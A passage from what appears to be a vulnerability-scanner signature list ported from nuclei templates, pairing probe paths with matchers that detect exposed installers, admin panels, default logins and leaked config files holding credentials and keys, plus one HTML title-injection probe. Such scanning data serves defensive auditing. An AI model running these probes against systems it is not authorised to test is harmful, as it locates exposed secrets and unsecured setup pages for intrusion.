        "severity": 'high', "path": '/admin_dev.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Symfony Debug Mode (ported from nuclei template http/misconfiguration/symfony/symfony-debug.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['x-debug-token-link:', '/_profiler/', 'debug mode</a> is enabled.', 'id="sfWebDebugSymfony"'], 'condition': 'or'}],
    },
    {
        "id": 'ruckus-smartzone-install', "name": 'Ruckus SmartZone Exposed Installation',
        "severity": 'high', "path": '/adminweb/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Ruckus SmartZone Exposed Installation (ported from nuclei template http/misconfiguration/installer/ruckus-smartzone-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Welcome to the Ruckus', 'Setup Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'mlflow-unauth', "name": 'Mlflow - Unauthenticated Access',
        "severity": 'high', "path": '/ajax-api/2.0/preview/mlflow/experiments/get?experiment_id=0',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Mlflow - Unauthenticated Access (ported from nuclei template http/misconfiguration/mlflow-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['experiment_id', 'artifact_location'], 'condition': 'or'}],
    },
    {
        "id": 'phalcon-framework-source', "name": 'Phalcon Framework - Source Code Leakage',
        "severity": 'high', "path": '/anything_here',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Phalcon Framework - Source Code Leakage (ported from nuclei template http/exposures/configs/phalcon-framework-source.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Phalcon Framework', 'AnythingHereController'], 'condition': 'or'}],
    },
    {
        "id": 'apache-zeppelin-unauth', "name": 'Apache Zeppelin - Unauthenticated Access',
        "severity": 'high', "path": '/api/security/ticket',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache Zeppelin - Unauthenticated Access (ported from nuclei template http/misconfiguration/apache/apache-zeppelin-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['status":"OK', '"ticket":"anonymous"'], 'condition': 'or'}],
    },
    {
        "id": 'saltbo-zpan-installer', "name": 'Saltbo/zpan Installer - Exposure',
        "severity": 'high', "path": '/api/system/options/core.email',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Saltbo/zpan Installer - Exposure (ported from nuclei template http/misconfiguration/installer/saltbo-zpan-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>ZPan', 'system is not initialized'], 'condition': 'or'}],
    },
    {
        "id": 'photoprism-unauth-exposure', "name": 'PhotoPrism - Unauthenticated Exposure',
        "severity": 'high', "path": '/api/v1/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'PhotoPrism - Unauthenticated Exposure (ported from nuclei template http/misconfiguration/photoprism-unauth-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['PhotoPrism'], 'condition': 'or'}],
    },
    {
        "id": 'magento-config-disclosure', "name": 'Magento Configuration Panel - Detect',
        "severity": 'high', "path": '/app/etc/local.xml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Magento Configuration Panel - Detect (ported from nuclei template http/exposures/configs/magento-config-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['* Magento', '<dbname>'], 'condition': 'or'}],
    },
    {
        "id": 'wazuh-default-login', "name": 'Wazuh - Default Login',
        "severity": 'high', "path": '/app/login',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Wazuh - Default Login (ported from nuclei template http/default-logins/wazuh-default-login.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"username":', '"roles":'], 'condition': 'or'}],
    },
    {
        "id": 'hikvision-env', "name": 'Hikvision Springboot Env Actuator - Detect',
        "severity": 'high', "path": '/artemis/env',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Hikvision Springboot Env Actuator - Detect (ported from nuclei template http/misconfiguration/hikvision-env.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['applicationConfig', 'activeProfiles', 'server.port', 'local.server.port', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json'], 'condition': 'or'}],
    },
    {
        "id": 'artifactory-anonymous-deploy', "name": 'Artifactory anonymous deploy',
        "severity": 'high', "path": '/artifactory/ui/repodata?deploy=true',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Artifactory anonymous deploy (ported from nuclei template http/misconfiguration/artifactory-anonymous-deploy.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"repoKey"'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-terminal-exposure', "name": 'Laravel Terminal - Exposed',
        "severity": 'high', "path": '/asf/terminal',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Terminal - Exposed (ported from nuclei template http/misconfiguration/laravel-terminal-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Laravel Terminal', 'terminal.endpoint'], 'condition': 'or'}],
    },
    {
        "id": 'auth-json', "name": 'Auth.json File - Disclosure',
        "severity": 'high', "path": '/auth.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Auth.json File - Disclosure (ported from nuclei template http/exposures/files/auth-json.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"http-basic": {', '"username":', '"password":', '"github-oauth": {', '"github.com":', '"bitbucket-oauth":', '"consumer-key":', '"consumer-secret":'], 'condition': 'or'}],
    },
    {
        "id": 'call-com-installer', "name": 'Call.com Setup Page - Exposure',
        "severity": 'high', "path": '/auth/setup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Call.com Setup Page - Exposure (ported from nuclei template http/misconfiguration/installer/call-com-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Setup | Cal.com', 'Minimum 15 characters long</li>'], 'condition': 'or'}],
    },
    {
        "id": 'socks5-vpn-config', "name": 'Socks5 VPN - Sensitive File Disclosure',
        "severity": 'high', "path": '/backup/config.xml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Socks5 VPN - Sensitive File Disclosure (ported from nuclei template http/exposures/files/socks5-vpn-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<config>', 'password=', 'username='], 'condition': 'or'}],
    },
    {
        "id": 'avaya-phone-default-login', "name": 'Avaya Phone Web Interface - Default Login',
        "severity": 'high', "path": '/cgi-bin/J100WebServer.cgi?Operation=0',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Avaya Phone Web Interface - Default Login (ported from nuclei template http/default-logins/avaya-phone-default-login.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['/cgi-bin/J100WebServer.cgi?Operation=211', 'id=\\', 'Invalid username or password'], 'condition': 'or'}],
    },
    {
        "id": 'unauth-ckfinder', "name": 'CKFinder - Unauthenticated Exposure',
        "severity": 'high', "path": '/ckfinder/ckfinder.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'CKFinder - Unauthenticated Exposure (ported from nuclei template http/misconfiguration/unauth-ckfinder.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>CKFinder</title>', 'CKFinderFrameWindow', 'var ckfinder = new CKFinder', 'CKFinder.start()'], 'condition': 'or'}],
    },
    {
        "id": 'deos-openview-panel', "name": 'DEOS OPENview Admin Panel Unauthenticated Access',
        "severity": 'high', "path": '/client/index.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'DEOS OPENview Admin Panel Unauthenticated Access (ported from nuclei template http/misconfiguration/deos-openview-admin.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>OPENview</title>'], 'condition': 'or'}],
    },
    {
        "id": 'collibra-properties', "name": 'Collibra Properties Exposure',
        "severity": 'high', "path": '/collibra.properties',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Collibra Properties Exposure (ported from nuclei template http/exposures/configs/collibra-properties.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['collibra.url', 'collibra.port', 'collibra.user', 'collibra.password', 'bytes'], 'condition': 'or'}],
    },
    {
        "id": 'prometheus-unauth', "name": 'Prometheus Monitoring System - Unauthenticated',
        "severity": 'high', "path": '/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Prometheus Monitoring System - Unauthenticated (ported from nuclei template http/misconfiguration/prometheus/prometheus-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['global:', 'scrape_configs:', 'scrape_interval'], 'condition': 'or'}],
    },
    {
        "id": 'unauthenticated-zipkin', "name": 'Zipkin Discovery',
        "severity": 'high', "path": '/config.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Zipkin Discovery (ported from nuclei template http/misconfiguration/unauthenticated-zipkin.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['environment', 'defaultLookback'], 'condition': 'or'}],
    },
    {
        "id": 'config-properties', "name": 'Config Properties Exposure',
        "severity": 'high', "path": '/config.properties',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Config Properties Exposure (ported from nuclei template http/exposures/configs/config-properties.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['bytes'], 'condition': 'or'}],
    },
    {
        "id": 'rails-database-config', "name": 'Ruby on Rails Database Configuration File - Detect',
        "severity": 'high', "path": '/config/database.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Ruby on Rails Database Configuration File - Detect (ported from nuclei template http/exposures/configs/rails-database-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['adapter:', 'database:', 'production:'], 'condition': 'or'}],
    },
    {
        "id": 'symfony-database-config', "name": 'Symfony Database Configuration File - Detect',
        "severity": 'high', "path": '/config/databases.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Symfony Database Configuration File - Detect (ported from nuclei template http/exposures/configs/symfony-database-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['class:', 'param:'], 'condition': 'or'}],
    },
    {
        "id": 'sphinxsearch-config', "name": 'Sphinx Search Config - Exposure',
        "severity": 'high', "path": '/config/development.sphinx.conf',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Sphinx Search Config - Exposure (ported from nuclei template http/exposures/configs/sphinxsearch-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['sql_user', 'sql_pass', 'indexer'], 'condition': 'or'}],
    },
    {
        "id": 'pcoweb-unauth', "name": 'pCOWeb - Unauth',
        "severity": 'high', "path": '/config/pw_left_bar.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'pCOWeb - Unauth (ported from nuclei template http/misconfiguration/pcoweb-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['System is using', 'pCOWeb', 'Configuration'], 'condition': 'or'}],
    },
    {
        "id": 'redmine-config', "name": 'Redmine Configuration File - Detect',
        "severity": 'high', "path": '/configuration.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Redmine Configuration File - Detect (ported from nuclei template http/exposures/files/redmine-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['user_name', 'Redmine'], 'condition': 'or'}],
    },
    {
        "id": 'jackett-installer', "name": 'Jackett - Installer',
        "severity": 'high', "path": '/configure',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Jackett - Installer (ported from nuclei template http/misconfiguration/installer/jackett-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Jackett', 'Install</a>'], 'condition': 'or'}],
    },
    {
        "id": 'aem-explorer-nodetypes', "name": 'Adobe AEM Explorer NodeTypes Exposure',
        "severity": 'high', "path": '/crx/explorer/nodetypes/index.jsp',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Adobe AEM Explorer NodeTypes Exposure (ported from nuclei template http/misconfiguration/aem/aem-explorer-nodetypes.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['nodetypeadmin', 'Registered Node Types'], 'condition': 'or'}],
    },
    {
        "id": 'darkstat-detect', "name": 'Detect Darkstat Reports',
        "severity": 'high', "path": '/darkstat/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Darkstat Reports (ported from nuclei template http/exposures/logs/darkstat-detect.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['darkstat', '<title>Graphs', 'Measuring for', 'hosts</a>'], 'condition': 'or'}],
    },
    {
        "id": 'robomongo-credential', "name": 'RoboMongo Credential - Exposure',
        "severity": 'high', "path": '/db/robomongo.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'RoboMongo Credential - Exposure (ported from nuclei template http/exposures/configs/robomongo-credential.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['databaseName', 'userPassword', 'serverHost'], 'condition': 'or'}],
    },
    {
        "id": 'openbmcs-secret-disclosure', "name": 'OpenBMCS 2.4 - Information Disclosure',
        "severity": 'high', "path": '/debug/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OpenBMCS 2.4 - Information Disclosure (ported from nuclei template http/misconfiguration/openbmcs/openbmcs-secret-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['change_password_sqls', 'Index of /debug'], 'condition': 'or'}],
    },
    {
        "id": 'sftp-deployment-config', "name": 'Atom SFTP Configuration File - Detect',
        "severity": 'high', "path": '/deployment-config.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Atom SFTP Configuration File - Detect (ported from nuclei template http/exposures/configs/sftp-deployment-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"host":', '"username":', '"password":', '"remotePath":'], 'condition': 'or'}],
    },
    {
        "id": 'druid-monitor', "name": 'Alibaba Druid Monitor Unauthorized Access',
        "severity": 'high', "path": '/druid/index.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Alibaba Druid Monitor Unauthorized Access (ported from nuclei template http/misconfiguration/druid-monitor.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Druid Stat Index</title>'], 'condition': 'or'}],
    },
    {
        "id": 'spip-install', "name": 'SPIP Install - Exposure',
        "severity": 'high', "path": '/ecrire/?exec=install',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SPIP Install - Exposure (ported from nuclei template http/misconfiguration/installer/spip-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Installing publication system...', 'SPIP'], 'condition': 'or'}],
    },
    {
        "id": 'elmah-log-file', "name": 'ELMAH Exposure',
        "severity": 'high', "path": '/elmah',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ELMAH Exposure (ported from nuclei template http/exposures/logs/elmah-log-file.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Error Log for'], 'condition': 'or'}],
    },
    {
        "id": 'ftp-credentials-exposure', "name": 'FTP Credentials Exposure',
        "severity": 'high', "path": '/ftpsync.settings',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'FTP Credentials Exposure (ported from nuclei template http/exposures/configs/ftp-credentials-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['FTPSync', 'overwrite_newer_prevention', 'default_folder_permissions'], 'condition': 'or'}],
    },
    {
        "id": 'gocd-cruise-configuration', "name": 'GoCd Cruise Configuration disclosure',
        "severity": 'high', "path": '/go/add-on/business-continuity/api/cruise_config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'GoCd Cruise Configuration disclosure (ported from nuclei template http/misconfiguration/gocd/gocd-cruise-configuration.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['server agentAutoRegisterKey', 'webhookSecret', 'tokenGenerationKey'], 'condition': 'or'}],
    },
    {
        "id": 'unauth-axyom-network-manager', "name": 'Unauthenticated Axyom Network Manager',
        "severity": 'high', "path": '/home',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Unauthenticated Axyom Network Manager (ported from nuclei template http/misconfiguration/unauth-axyom-network-manager.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Axyom Network Manager'], 'condition': 'or'}],
    },
    {
        "id": 'freshrss-unauth', "name": 'Freshrss Admin Dashboard - Exposed',
        "severity": 'high', "path": '/i/?a=logs',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Freshrss Admin Dashboard - Exposed (ported from nuclei template http/misconfiguration/freshrss-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['a=logout', 'FreshRSS', 'c=user&amp;a=profile'], 'condition': 'or'}],
    },
    {
        "id": 'freshrss-installer', "name": 'FreshRSS - Installation',
        "severity": 'high', "path": '/i/?rid',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'FreshRSS - Installation (ported from nuclei template http/misconfiguration/installer/freshrss-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Installation · FreshRSS'], 'condition': 'or'}],
    },
    {
        "id": 'icinga-installer', "name": 'Icinga Web 2 Installer Exposure',
        "severity": 'high', "path": '/icingaweb2/setup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Icinga Web 2 Installer Exposure (ported from nuclei template http/misconfiguration/installer/icinga-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Welcome to the configuration of Icinga Web 2', 'Setup Token'], 'condition': 'or'}],
    },
    {
        "id": 'concrete-installer', "name": 'Concrete Installer',
        "severity": 'high', "path": '/index.php/install',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Concrete Installer (ported from nuclei template http/misconfiguration/installer/concrete-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['install concrete', 'choose language'], 'condition': 'or'}],
    },
    {
        "id": 'magento-installer', "name": 'Magento Installation Wizard',
        "severity": 'high', "path": '/index.php/install/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Magento Installation Wizard (ported from nuclei template http/misconfiguration/installer/magento-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Magento Installation Wizard', "Welcome to Magento's Installation Wizard!"], 'condition': 'or'}],
    },
    {
        "id": 'testrail-install', "name": 'TestRail Installation Wizard',
        "severity": 'high', "path": '/index.php?/installer',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'TestRail Installation Wizard (ported from nuclei template http/misconfiguration/installer/testrail-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['TestRail Installation Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'phpipam-installer', "name": 'PHP IPAM Installation Page - Exposed',
        "severity": 'high', "path": '/index.php?page=install',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'PHP IPAM Installation Page - Exposed (ported from nuclei template http/misconfiguration/installer/phpipam-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>phpipam installation</title>'], 'condition': 'or'}],
    },
    {
        "id": 'freescout-installer', "name": 'FreeScout Installer Exposure',
        "severity": 'high', "path": '/install',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'FreeScout Installer Exposure (ported from nuclei template http/misconfiguration/installer/freescout-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['FreeScout Installer', 'Easy Installation and Setup Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'adguard-installer', "name": 'AdGuard - Installation',
        "severity": 'high', "path": '/install.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AdGuard - Installation (ported from nuclei template http/misconfiguration/installer/adguard-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Setup AdGuard Home'], 'condition': 'or'}],
    },
    {
        "id": 'emlog-installer', "name": 'Emlog Pro - Installation',
        "severity": 'high', "path": '/install.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Emlog Pro - Installation (ported from nuclei template http/misconfiguration/installer/emlog-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['>MySQL', 'install.php?action=install', 'emlog'], 'condition': 'or'}],
    },
    {
        "id": 'drupal-install', "name": 'Drupal Install',
        "severity": 'high', "path": '/install.php?profile=default',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Drupal Install (ported from nuclei template http/misconfiguration/installer/drupal-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Choose language | Drupal</title>'], 'condition': 'or'}],
    },
    {
        "id": 'tasmota-install', "name": 'Tasmota Installer Exposure',
        "severity": 'high', "path": '/install/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Tasmota Installer Exposure (ported from nuclei template http/misconfiguration/installer/tasmota-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Install Tasmota', 'Tasmota Installer'], 'condition': 'or'}],
    },
    {
        "id": 'phpbb-installer', "name": 'phpBB Installation File Exposure',
        "severity": 'high', "path": '/install/app.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'phpBB Installation File Exposure (ported from nuclei template http/misconfiguration/installer/phpbb-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Installation Panel', 'Introduction'], 'condition': 'or'}],
    },
    {
        "id": 'librenms-installer', "name": 'LibreNMS Installation Page - Exposure',
        "severity": 'high', "path": '/install/checks',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'LibreNMS Installation Page - Exposure (ported from nuclei template http/misconfiguration/installer/librenms-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['LibreNMS Install'], 'condition': 'or'}],
    },
    {
        "id": 'strongshop-installer', "name": 'StrongShop Installer - Exposure',
        "severity": 'high', "path": '/install/index.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'StrongShop Installer - Exposure (ported from nuclei template http/misconfiguration/installer/strongshop-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['StrongShop', 'id="install'], 'condition': 'or'}],
    },
    {
        "id": 'eyoucms-installer', "name": 'EyouCMS - Installation',
        "severity": 'high', "path": '/install/index.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'EyouCMS - Installation (ported from nuclei template http/misconfiguration/installer/eyoucms-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['EyouCms', '/install/index.php?step=2', '使用协议</p>'], 'condition': 'or'}],
    },
    {
        "id": 'easy-wi-installer', "name": 'Easy-WI Installation Page - Exposure',
        "severity": 'high', "path": '/install/install.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Easy-WI Installation Page - Exposure (ported from nuclei template http/misconfiguration/installer/easy-wi-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Welcome to the Easy-WI installer!'], 'condition': 'or'}],
    },
    {
        "id": 'growi-installer', "name": 'GROWI Installer - Exposure',
        "severity": 'high', "path": '/installer',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'GROWI Installer - Exposure (ported from nuclei template http/misconfiguration/installer/growi-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Installer - GROWI</title>'], 'condition': 'or'}],
    },
    {
        "id": 'orangehrm-installer', "name": 'OrangeHrm Installer',
        "severity": 'high', "path": '/installer/installerUI.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OrangeHrm Installer (ported from nuclei template http/misconfiguration/installer/orangehrm-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['OrangeHRM Web Installation Wizard', 'admin user creation'], 'condition': 'or'}],
    },
    {
        "id": 'webmethod-integration-default-login', "name": 'WebMethod Integration Server Default Login',
        "severity": 'high', "path": '/invoke/pub.file/getFile',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'WebMethod Integration Server Default Login (ported from nuclei template http/default-logins/webmethod/webmethod-integration-default-login.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['com.wm.app.b2b.server', 'No filename supplied', 'com.wm.app.b2b.server.AccessException', 'Invalid credentials'], 'condition': 'or'}],
    },
    {
        "id": 'elasticsearch-default-login', "name": 'ElasticSearch - Default Login',
        "severity": 'high', "path": '/login',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ElasticSearch - Default Login (ported from nuclei template http/default-logins/elasticsearch/elasticsearch-default-login.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Set-Cookie: sid=', 'kbn-license-sig:'], 'condition': 'or'}],
    },
    {
        "id": 'servicenow-title-injection', "name": 'Service Now - Title Injection',
        "severity": 'high', "path": '/login.do?jvar_page_title=<style><foo>Injected Title</foo></style>',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Service Now - Title Injection (ported from nuclei template http/misconfiguration/servicenow-title-injection.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title><style><foo>Injected Title</foo></style></title>'], 'condition': 'or'}],
    },
    {
        "id": 'dell-idrac-default-login', "name": 'Dell iDRAC6/7/8 Default Login',
        "severity": 'high', "path": '/login.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Dell iDRAC6/7/8 Default Login (ported from nuclei template http/default-logins/dell/dell-idrac-default-login.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<authResult>0</authResult>'], 'condition': 'or'}],
    },
    {
        "id": 'django-secret-key', "name": 'Django Secret Key Exposure',
        "severity": 'high', "path": '/manage.py',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Django Secret Key Exposure (ported from nuclei template http/exposures/files/django-secret-key.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SECRET_KEY ='], 'condition': 'or'}],
    },
    {
        "id": 'unifi-wizard-install', "name": 'UniFi Wizard Installer',
        "severity": 'high', "path": '/manage/wizard/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'UniFi Wizard Installer (ported from nuclei template http/misconfiguration/installer/unifi-wizard-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['UniFi Wizard', 'app-unifi-wizard'], 'condition': 'or'}],
    },
    {
        "id": 'nagios-logserver-installer', "name": 'Nagios Log Server - Install',
        "severity": 'high', "path": '/nagioslogserver/install',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Nagios Log Server - Install (ported from nuclei template http/misconfiguration/installer/nagios-logserver-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Nagios Log Server', 'Install</a>'], 'condition': 'or'}],
    },
    {
        "id": 'apache-nifi-unauth', "name": 'Apache NiFi - Unauthenticated Access',
        "severity": 'high', "path": '/nifi-api/access/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache NiFi - Unauthenticated Access (ported from nuclei template http/misconfiguration/apache/apache-nifi-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"supportsLogin":false}'], 'condition': 'or'}],
    },
    {
        "id": 'private-key-exposure', "name": 'Private key exposure via helper detector',
        "severity": 'high', "path": '/node_modules/mqtt/test/helpers/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Private key exposure via helper detector (ported from nuclei template http/misconfiguration/private-key-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /node_modules/mqtt/test/helpers', 'Parent Directory'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-nova-unauth', "name": 'Laravel Nova - Unauthenticated Admin Panel Access',
        "severity": 'high', "path": '/nova/dashboards/main',
